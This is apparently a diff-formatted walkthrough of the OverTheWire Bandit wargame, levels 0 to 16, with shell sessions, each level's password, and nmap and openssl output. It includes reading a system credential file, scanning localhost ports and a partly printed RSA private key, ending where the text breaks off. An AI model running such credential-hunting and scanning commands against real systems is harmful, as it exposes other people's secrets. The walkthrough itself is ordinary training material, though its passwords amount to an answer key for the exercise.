@@ -1,0 +1,1071 @@
+Level 0:
+
+Just ssh into the machine using the given credentials.
+
+bandit0@bandit:~$ ls
+readme
+bandit0@bandit:~$ cat readme
+boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+
+bandit1:boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+
+Use this password to login into bandit1
+
+Level 1:
+
+ ssh bandit1@bandit.labs.overthewire.org -p 2220
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit1@bandit.labs.overthewire.org's password:
+Linux bandit.otw.local 5.4.8 x86_64 GNU/Linux
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+bandit1@bandit:~$ cat ./-
+CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+
+bandit2:CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+
+Level 2:
+
+bandit2@bandit:~$ cat "spaces in this filename"
+UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+
+bandit3:UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+
+
+Level 3:
+
+bandit3@bandit:~$ cd inhere/
+bandit3@bandit:~/inhere$ ls -la
+total 12
+drwxr-xr-x 2 root    root    4096 May  7  2020 .
+drwxr-xr-x 3 root    root    4096 May  7  2020 ..
+-rw-r----- 1 bandit4 bandit3   33 May  7  2020 .hidden
+bandit3@bandit:~/inhere$ cat .hidden
+pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+
+
+bandit4:pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+
+Level 4:
+
+bandit4@bandit:~$ cd inhere
+bandit4@bandit:~/inhere$ ls -la
+total 48
+drwxr-xr-x 2 root    root    4096 May  7  2020 .
+drwxr-xr-x 3 root    root    4096 May  7  2020 ..
+-rw-r----- 1 bandit5 bandit4   33 May  7  2020 -file00
+-rw-r----- 1 bandit5 bandit4   33 May  7  2020 -file01
+-rw-r----- 1 bandit5 bandit4   33 May  7  2020 -file02
+-rw-r----- 1 bandit5 bandit4   33 May  7  2020 -file03
+-rw-r----- 1 bandit5 bandit4   33 May  7  2020 -file04
+-rw-r----- 1 bandit5 bandit4   33 May  7  2020 -file05
+-rw-r----- 1 bandit5 bandit4   33 May  7  2020 -file06
+-rw-r----- 1 bandit5 bandit4   33 May  7  2020 -file07
+-rw-r----- 1 bandit5 bandit4   33 May  7  2020 -file08
+-rw-r----- 1 bandit5 bandit4   33 May  7  2020 -file09
+bandit4@bandit:~/inhere$ grep -Rn "[a-zA-Z0-9]" .
+Binary file ./-file01 matches
+Binary file ./-file00 matches
+Binary file ./-file06 matches
+Binary file ./-file03 matches
+Binary file ./-file05 matches
+Binary file ./-file08 matches
+Binary file ./-file04 matches
+./-file07:1:koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+Binary file ./-file02 matches
+Binary file ./-file09 matches
+
+bandit5:koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+
+Level 5:
+
+human-readable
+1033 bytes in size
+not executable
+
+bandit5@bandit:~$ ls
+inhere
+bandit5@bandit:~$ cd inhere
+bandit5@bandit:~/inhere$ ls
+maybehere00  maybehere02  maybehere04  maybehere06  maybehere08  maybehere10  maybehere12  maybehere14  maybehere16  maybehere18
+maybehere01  maybehere03  maybehere05  maybehere07  maybehere09  maybehere11  maybehere13  maybehere15  maybehere17  maybehere19
+bandit5@bandit:~/inhere$ find . -type f -size 1033c 2>/dev/null
+./maybehere07/.file2
+
+bandit5@bandit:~/inhere$ cat ./maybehere07/.file2
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+
+bandit6:DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+
+Level 6:
+
+owned by user bandit7
+owned by group bandit6
+33 bytes in size
+
+bandit6@bandit:~$ ls -la
+total 20
+drwxr-xr-x  2 root root 4096 May  7  2020 .
+drwxr-xr-x 41 root root 4096 May  7  2020 ..
+-rw-r--r--  1 root root  220 May 15  2017 .bash_logout
+-rw-r--r--  1 root root 3526 May 15  2017 .bashrc
+-rw-r--r--  1 root root  675 May 15  2017 .profile
+bandit6@bandit:~$ find / -user "bandit7" -group "bandit6" -size 33c 2>/dev/null
+/var/lib/dpkg/info/bandit7.password
+bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password
+HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+bandit6@bandit:~$
+
+bandit7:HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+
+Level 7:
+
+bandit7@bandit:~$ ls -la
+total 4108
+drwxr-xr-x  2 root    root       4096 May  7  2020 .
+drwxr-xr-x 41 root    root       4096 May  7  2020 ..
+-rw-r--r--  1 root    root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root    root       3526 May 15  2017 .bashrc
+-rw-r-----  1 bandit8 bandit7 4184396 May  7  2020 data.txt
+-rw-r--r--  1 root    root        675 May 15  2017 .profile
+
+The password for the next level is stored in the file data.txt next to the word millionth
+
+The file is really big so we will make the use of less command here.
+
+hornet  rvcSQxLCwLKwoyqm63MrBslRiPuYJb3s
+strawberries    2eBpUI6IQPMNGTczLJ1TfGtrdrKEZS6j
+underscoring    wNZpurNbV0FnbTghHTq0hEofX8f6pYHK
+pandemonium's   ARVA7KNd7GoSg3F8ujJGHVP3OFQlzG3v
+marathon's      ynH2KPv84Tf2cXgTdxXDCWP17ED7uDxK
+sleaze  MhLs49f71SUCXRhuMBvnAQ6iJx7VPKwE
+/millionth
+
+Forward slash and the word name "millionth"
+
+millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+shied   OfMT7PpeOvra4NWlZz7JOzyjL236NFVF
+sesame  K1M1XuyPoCOkuEz6QB9gsyCW9dUqGXKx
+
+bandit8:cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+
+Level 8:
+
+The password for the next level is stored in the file data.txt and is the only line of text that occurs only once
+
+bandit8@bandit:/home$ cd bandit8
+bandit8@bandit:~$ ls
+data.txt
+bandit8@bandit:~$ cat data.txt | sort | uniq -u
+UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+
+bandit9:UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+
+Level 9:
+
+bandit9@bandit:~$ strings data.txt | grep -E "=+"
+========== the*2i"4
+=:G e
+========== password
+<I=zsGi
+Z)========== is
+A=|t&E
+Zdb=
+c^ LAh=3G
+*SF=s
+&========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+S=A.H&^
+bandit9@bandit:~$ strings data.txt | grep -E "=+"
+
+bandit10:truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+
+Level 10:
+
+The password for the next level is stored in the file data.txt, which contains base64 encoded data
+
+bandit10@bandit:~$ cat data.txt | base64 -d
+The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+
+bandit11:IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+
+
+Level 11:
+The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions
+
+bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+
+bandit12:5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+
+Level 12:
+
+The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)
+
+bandit12@bandit:/tmp/akshay$ file data2.bin
+data2.bin: gzip compressed data, was "data2.bin", last modified: Thu May  7 18:14:30 2020, max compression, from Unix
+bandit12@bandit:/tmp/akshay$ mv data2.bin data2.gz
+bandit12@bandit:/tmp/akshay$ file data2.gz
+data2.gz: gzip compressed data, was "data2.bin", last modified: Thu May  7 18:14:30 2020, max compression, from Unix
+bandit12@bandit:/tmp/akshay$ mv data2.gz data2.bin.gz
+bandit12@bandit:/tmp/akshay$ gzip -d data2.bin.gz
+bandit12@bandit:/tmp/akshay$ ls
+data  data2.bin  data.txt
+bandit12@bandit:/tmp/akshay$ file data2.bin
+data2.bin: bzip2 compressed data, block size = 900k
+bandit12@bandit:/tmp/akshay$ mv data2.bin data2.bin.bz2
+bandit12@bandit:/tmp/akshay$ bzip2 -d data2.bin.bz2
+bandit12@bandit:/tmp/akshay$ ls
+data  data2.bin  data.txt
+bandit12@bandit:/tmp/akshay$ file data2.bin
+data2.bin: gzip compressed data, was "data4.bin", last modified: Thu May  7 18:14:30 2020, max compression, from Unix
+bandit12@bandit:/tmp/akshay$ mv data2.bin data4.bin.gz
+bandit12@bandit:/tmp/akshay$ gzip -d data4.bin.gz
+
+
+bandit12@bandit:/tmp/akshay$ file data4.bin
+data4.bin: POSIX tar archive (GNU)
+bandit12@bandit:/tmp/akshay$ mv data4.bin data4.bin.tar
+bandit12@bandit:/tmp/akshay$ tar xvf data4.bin.tar
+data5.bin
+bandit12@bandit:/tmp/akshay$ ls
+data  data4.bin.tar  data5.bin  data.txt
+bandit12@bandit:/tmp/akshay$ file data5.bin
+data5.bin: POSIX tar archive (GNU)
+bandit12@bandit:/tmp/akshay$ mv data5.bin data5.bin.tar
+bandit12@bandit:/tmp/akshay$ tar xvf data5.bin.tar
+data6.bin
+bandit12@bandit:/tmp/akshay$ file data6.bin
+data6.bin: bzip2 compressed data, block size = 900k
+bandit12@bandit:/tmp/akshay$ mv data6.bin data6.bin.bz2
+bandit12@bandit:/tmp/akshay$ ls
+data  data4.bin.tar  data5.bin.tar  data6.bin.bz2  data.txt
+bandit12@bandit:/tmp/akshay$ bzip2 -d data6.bin.bz2
+bandit12@bandit:/tmp/akshay$ ls
+data  data4.bin.tar  data5.bin.tar  data6.bin  data.txt
+bandit12@bandit:/tmp/akshay$ file data6.bin
+data6.bin: POSIX tar archive (GNU)
+bandit12@bandit:/tmp/akshay$ mv data6.bin data6.bin.tar
+bandit12@bandit:/tmp/akshay$ tar xvf data6.bin.tar
+data8.bin
+bandit12@bandit:/tmp/akshay$ ls
+data  data4.bin.tar  data5.bin.tar  data6.bin.tar  data8.bin  data.txt
+bandit12@bandit:/tmp/akshay$ file data8.bin
+data8.bin: gzip compressed data, was "data9.bin", last modified: Thu May  7 18:14:30 2020, max compression, from Unix
+bandit12@bandit:/tmp/akshay$ mv data8.bin data8.bin.gz
+bandit12@bandit:/tmp/akshay$ gzip -d data8.bin.gz
+bandit12@bandit:/tmp/akshay$ ls
+
+bandit12@bandit:/tmp/akshay$ file data8.bin
+data8.bin: ASCII text
+bandit12@bandit:/tmp/akshay$ cat data8.bin
+The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+
+
+bandit13:8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+
+
+Level 13:
+
+bandit13@bandit:~$ ls -la
+total 24
+drwxr-xr-x  2 root     root     4096 May  7  2020 .
+drwxr-xr-x 41 root     root     4096 May  7  2020 ..
+-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
+-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
+-rw-r--r--  1 root     root      675 May 15  2017 .profile
+-rw-r-----  1 bandit14 bandit13 1679 May  7  2020 sshkey.private
+bandit13@bandit:~$ file sshkey.private
+sshkey.private: PEM RSA private key
+bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
+Could not create directory '/home/bandit13/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+
+bandit14:4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+
+Level 14:
+
+The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.
+
+bandit14@bandit:~$ nc localhost 30000
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+Correct!
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+bandit15:BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+Level 15:
+
+The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.
+
+bandit15@bandit:~$ openssl s_client -connect localhost:30001
+CONNECTED(00000003)
+depth=0 CN = localhost
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = localhost
+verify return:1
+---
+Certificate chain
+ 0 s:/CN=localhost
+   i:/CN=localhost
+---
+Server certificate
+-----BEGIN CERTIFICATE-----
+MIICBjCCAW+gAwIBAgIEDU18oTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls
+b2NhbGhvc3QwHhcNMjAwNTA3MTgxNTQzWhcNMjEwNTA3MTgxNTQzWjAUMRIwEAYD
+VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAK3CPNFR
+FEypcqUa8NslmIMWl9xq53Cwhs/fvYHAvauyfE3uDVyyX79Z34Tkot6YflAoufnS
++puh2Kgq7aDaF+xhE+FPcz1JE0C2bflGfEtx4l3qy79SRpLiZ7eio8NPasvduG5e
+pkuHefwI4c7GS6Y7OTz/6IpxqXBzv3c+x93TAgMBAAGjZTBjMBQGA1UdEQQNMAuC
+CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0
+ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3
+DQEBBQUAA4GBAC9uy1rF2U/OSBXbQJYuPuzT5mYwcjEEV0XwyiX1MFZbKUlyFZUw
+rq+P1HfFp+BSODtk6tHM9bTz+p2OJRXuELG0ly8+Nf/hO/mYS1i5Ekzv4PL9hO8q
+PfmDXTHs23Tc7ctLqPRj4/4qxw6RF4SM+uxkAuHgT/NDW1LphxkJlKGn
+-----END CERTIFICATE-----
+subject=/CN=localhost
+issuer=/CN=localhost
+---
+No client certificate CA names sent
+Peer signing digest: SHA512
+Server Temp Key: X25519, 253 bits
+---
+SSL handshake has read 1019 bytes and written 269 bytes
+Verification error: self signed certificate
+---
+New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
+Server public key is 1024 bit
+Secure Renegotiation IS supported
+Compression: NONE
+Expansion: NONE
+No ALPN negotiated
+SSL-Session:
+    Protocol  : TLSv1.2
+    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
+    Session-ID: 454CC7ECC07482BBB5F230FF5C4C5BB0034A15B042E6A2A7482A5D370A9655B8
+    Session-ID-ctx:
+    Master-Key: 1467B00747C98E8139C30B1364AF8D1A9A129B86A5626C5D959D6FAC115D436B5DC226A07FB5A66DCCB7E70BA7A49CB2
+    PSK identity: None
+    PSK identity hint: None
+    SRP username: None
+    TLS session ticket lifetime hint: 7200 (seconds)
+    TLS session ticket:
+    0000 - aa 02 e6 3a 2e 0b c8 5d-6f 54 4a 1b 5a e0 2c 0e   ...:...]oTJ.Z.,.
+    0010 - ce 83 d7 d1 68 2e 42 04-3d f3 dd 07 f2 a4 2e 52   ....h.B.=......R
+    0020 - 8c df a6 6b b4 09 98 70-de f9 5d cf 49 33 da 80   ...k...p..].I3..
+    0030 - df 37 49 28 a3 0e 7c 3d-17 49 63 00 dc c1 e2 ea   .7I(..|=.Ic.....
+    0040 - 00 d5 65 d2 a9 45 3a 36-46 87 25 2b e7 3d 00 c9   ..e..E:6F.%+.=..
+    0050 - 48 54 3f 83 43 5d 15 b5-48 06 86 01 56 97 7b 7e   HT?.C]..H...V.{~
+    0060 - 06 7d fb 33 05 a0 cf 96-cd 35 4a ee dd 75 d5 87   .}.3.....5J..u..
+    0070 - ee 16 2f 8c 7b 74 78 31-5e 5b 7e d7 59 25 29 68   ../.{tx1^[~.Y%)h
+    0080 - c8 e8 22 1d 3e e1 74 f3-89 eb b3 47 f7 70 bf ea   ..".>.t....G.p..
+    0090 - 4b 17 59 7e 96 74 75 f8-da c6 6f df 6a c4 11 e2   K.Y~.tu...o.j...
+
+    Start Time: 1608713211
+    Timeout   : 7200 (sec)
+    Verify return code: 18 (self signed certificate)
+    Extended master secret: yes
+---
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+Correct!
+cluFn7wTiGryunymYOu4RcffSxQluehd
+
+closed
+
+bandit16:cluFn7wTiGryunymYOu4RcffSxQluehd
+
+Level 16:
+
+The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it
+
+bandit16@bandit:~$ nmap -sV -p31000-32000 localhost
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2020-12-23 09:49 CET
+Stats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 80.00% done; ETC: 09:50 (0:00:16 remaining)
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00044s latency).
+Not shown: 996 closed ports
+PORT      STATE SERVICE     VERSION
+31046/tcp open  echo
+31518/tcp open  ssl/echo
+31691/tcp open  echo
+31790/tcp open  ssl/unknown
+31960/tcp open  echo
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port31790-TCP:V=7.40%T=SSL%I=7%D=12/23%Time=5FE304B5%P=x86_64-pc-linux-
+SF:gnu%r(GenericLines,31,"Wrong!\x20Please\x20enter\x20the\x20correct\x20c
+SF:urrent\x20password\n")%r(GetRequest,31,"Wrong!\x20Please\x20enter\x20th
+SF:e\x20correct\x20current\x20password\n")%r(HTTPOptions,31,"Wrong!\x20Ple
+SF:ase\x20enter\x20the\x20correct\x20current\x20password\n")%r(RTSPRequest
+SF:,31,"Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20password
+SF:\n")%r(Help,31,"Wrong!\x20Please\x20enter\x20the\x20correct\x20current\
+SF:x20password\n")%r(SSLSessionReq,31,"Wrong!\x20Please\x20enter\x20the\x2
+SF:0correct\x20current\x20password\n")%r(TLSSessionReq,31,"Wrong!\x20Pleas
+SF:e\x20enter\x20the\x20correct\x20current\x20password\n")%r(Kerberos,31,"
+SF:Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20password\n")%
+SF:r(FourOhFourRequest,31,"Wrong!\x20Please\x20enter\x20the\x20correct\x20
+SF:current\x20password\n")%r(LPDString,31,"Wrong!\x20Please\x20enter\x20th
+SF:e\x20correct\x20current\x20password\n")%r(LDAPSearchReq,31,"Wrong!\x20P
+SF:lease\x20enter\x20the\x20correct\x20current\x20password\n")%r(SIPOption
+SF:s,31,"Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20passwor
+SF:d\n");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 88.89 seconds
+bandit16@bandit:~$ openssl s_client -connect localhost:31518
+CONNECTED(00000003)
+depth=0 CN = localhost
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = localhost
+verify return:1
+---
+Certificate chain
+ 0 s:/CN=localhost
+   i:/CN=localhost
+---
+Server certificate
+-----BEGIN CERTIFICATE-----
+MIICBjCCAW+gAwIBAgIEaEEsYzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls
+b2NhbGhvc3QwHhcNMjAxMTA0MTUyNDI3WhcNMjExMTA0MTUyNDI3WjAUMRIwEAYD
+VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAKz7ftrS
+gbq3aNjGjO1QYL5CT5wT2OuswSnTMXJRJYI+zJsXbch1soRY5mwCBfESebkOs4p4
+lv8fdEOSgCG29HB5zEUYiSfPNLJm6CySQoVZnrvdvfzXPL2Ib3xwdqPQg1MebJnG
+IBxlT5YzmbqQX/OnAUaDioPiyJCBzsx17jmlAgMBAAGjZTBjMBQGA1UdEQQNMAuC
+CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0
+ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3
+DQEBBQUAA4GBAFHkLp3xOYDNN/NusrkT/jY+E0DFnI7UfaeQj/o3zbv0vJa1L9TR
+VkVIu4zia6MgBBahB2tbo6R7hCODfDvUyBn5vA1TGZrRTgqIvGoGkZpDKVlFqWSN
+S/PDvT6kdU+18uBHDyqEW5ykWK69+N/vjwayEKhVhMlEZl4lAA05Sezg
+-----END CERTIFICATE-----
+subject=/CN=localhost
+issuer=/CN=localhost
+---
+No client certificate CA names sent
+Peer signing digest: SHA512
+Server Temp Key: X25519, 253 bits
+---
+SSL handshake has read 1019 bytes and written 269 bytes
+Verification error: self signed certificate
+---
+New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
+Server public key is 1024 bit
+Secure Renegotiation IS supported
+Compression: NONE
+Expansion: NONE
+No ALPN negotiated
+SSL-Session:
+    Protocol  : TLSv1.2
+    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
+    Session-ID: 4C13417CB467C63F021E52DDF5BE6FAB4320EC071544CD4002B83D86FD8794A2
+    Session-ID-ctx:
+    Master-Key: 55101206395036B5548A81F37B276FEEF3068CCE1CA7EB24AEC81751BE528A7833E9F3AB94D82E1282176C68FFD95854
+    PSK identity: None
+    PSK identity hint: None
+    SRP username: None
+    TLS session ticket lifetime hint: 7200 (seconds)
+    TLS session ticket:
+    0000 - 28 68 a7 10 ba fc 9e 23-cc e2 c5 ec b5 f9 8c 42   (h.....#.......B
+    0010 - 20 d0 dd 91 3e 9d 9b b6-ce 26 61 25 03 b7 90 46    ...>....&a%...F
+    0020 - 7a 3f e5 ae e0 72 7e 47-dc 45 19 f9 27 9f 53 b0   z?...r~G.E..'.S.
+    0030 - 34 50 9f f5 30 a7 51 81-fc 50 3e af 4f 0b 2f 34   4P..0.Q..P>.O./4
+    0040 - 16 d8 a9 58 e9 2b 13 b9-e4 13 9b 8a a4 6c 53 2f   ...X.+.......lS/
+    0050 - 3a cf 07 c2 b5 82 6e 02-d9 c3 01 71 46 3e 79 7f   :.....n....qF>y.
+    0060 - 27 21 1d 16 41 c1 60 0f-18 82 2d 85 d8 47 63 a1   '!..A.`...-..Gc.
+    0070 - 26 c2 aa bb c9 42 6a 77-d9 7e 60 60 47 6b 17 27   &....Bjw.~``Gk.'
+    0080 - 86 15 05 52 3f 44 08 9a-30 ce f8 ae a1 39 b2 d6   ...R?D..0....9..
+    0090 - 06 cd 1c 8c 49 98 b1 f6-6c 5d fa f9 5d e9 bc f9   ....I...l]..]...
+
+    Start Time: 1608713513
+    Timeout   : 7200 (sec)
+    Verify return code: 18 (self signed certificate)
+    Extended master secret: yes
+---
+cluFn7wTiGryunymYOu4RcffSxQluehd
+cluFn7wTiGryunymYOu4RcffSxQluehd
+
+
+
+Wrong one.
+
+bandit16@bandit:~$ openssl s_client -connect localhost:31790
+CONNECTED(00000003)
+depth=0 CN = localhost
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = localhost
+verify return:1
+---
+Certificate chain
+ 0 s:/CN=localhost
+   i:/CN=localhost
+---
+Server certificate
+-----BEGIN CERTIFICATE-----
+MIICBjCCAW+gAwIBAgIERpugdDANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls
+b2NhbGhvc3QwHhcNMjAxMjAzMTIyNTAyWhcNMjExMjAzMTIyNTAyWjAUMRIwEAYD
+VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMeJ7q8+
+/5v/Q0OcS1qrtLv1GSYrXx8tddEmigEkXjxt96mbA62A7XPH6QZe5vVv6yOuS2JO
+AvtwxWXeb5lAkcR88pkvITjPa1QX+Q4LqNDpGs4evJDmBcX7NG8Sx9zFXChq5eRN
+Mis7GMk/RtwGbniNei1heI96rg2t0mRbR1kRAgMBAAGjZTBjMBQGA1UdEQQNMAuC
+CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0
+ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3
+DQEBBQUAA4GBADYJu67M8KiVPJo1HZsO+TW4bRr8rtrEKdirbH3CUEsZo3Wx6/PP
+C8w/rWjx7CnnjF4qrpZLFlZ2TY+/pNOIBhixCKS9MHZXVix4GAHP3BkUCExc1jE9
+mp1AQwblNeka4fPVkIrHfrRZQRJr96wT+YejVQqenVX6cFF2xpkpD+Me
+-----END CERTIFICATE-----
+subject=/CN=localhost
+issuer=/CN=localhost
+---
+No client certificate CA names sent
+Peer signing digest: SHA512
+Server Temp Key: X25519, 253 bits
+---
+SSL handshake has read 1019 bytes and written 269 bytes
+Verification error: self signed certificate
+---
+New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
+Server public key is 1024 bit
+Secure Renegotiation IS supported
+Compression: NONE
+Expansion: NONE
+No ALPN negotiated
+SSL-Session:
+    Protocol  : TLSv1.2
+    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
+    Session-ID: 281B3CFBD0ED5F149CFA94E0E28CAE74821956C7269995FAE6C538C6ADCF5C94
+    Session-ID-ctx:
+    Master-Key: A4B9A43DB4430F11E4A006FE2004FDC1F510DFDEE1F95031142630D24930229E2F6DA9EAB60AFC1B663F523961DB0B96
+    PSK identity: None
+    PSK identity hint: None
+    SRP username: None
+    TLS session ticket lifetime hint: 7200 (seconds)
+    TLS session ticket:
+    0000 - 71 44 15 26 06 51 98 56-4a 2f 37 3a 47 04 b9 e3   qD.&.Q.VJ/7:G...
+    0010 - 70 8d 28 fa 20 f7 d9 82-3d 5e 11 64 cc 46 40 a0   p.(. ...=^.d.F@.
+    0020 - 52 8c 2b 99 2c 2f 6f e5-37 cb 07 2d 76 bf 2f d7   R.+.,/o.7..-v./.
+    0030 - 5d 41 88 dd fa 5e b6 0e-73 a3 32 4b 9e ed a8 8d   ]A...^..s.2K....
+    0040 - ee b2 aa 3d d1 a8 b2 a9-c8 f2 9a 44 b0 5a 7b 8f   ...=.......D.Z{.
+    0050 - 6a ea bb 90 7a a6 3c 70-cf 68 b8 16 74 03 a3 72   j...z.<p.h..t..r
+    0060 - e7 40 66 66 0e 05 01 94-20 12 de a3 dd b8 6e b0   .@ff.... .....n.
+    0070 - d0 4f 73 5c 34 51 16 07-3a c8 79 86 6f 64 a8 f0   .Os\4Q..:.y.od..
+    0080 - d8 78 4e 0a 1e 1b 8e 87-36 5e b4 ec 56 a9 1e 2f   .xN.....6^..V../
+    0090 - 7a 12 ff 17 e2 eb 6b 4a-d4 65 8e 43 9a e6 2a 40   z.....kJ.e.C..*@
+
+    Start Time: 1608713529
+    Timeout   : 7200 (sec)
+    Verify return code: 18 (self signed certificate)
+    Extended master secret: yes
+---
+cluFn7wTiGryunymYOu4RcffSxQluehd
+Correct!
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
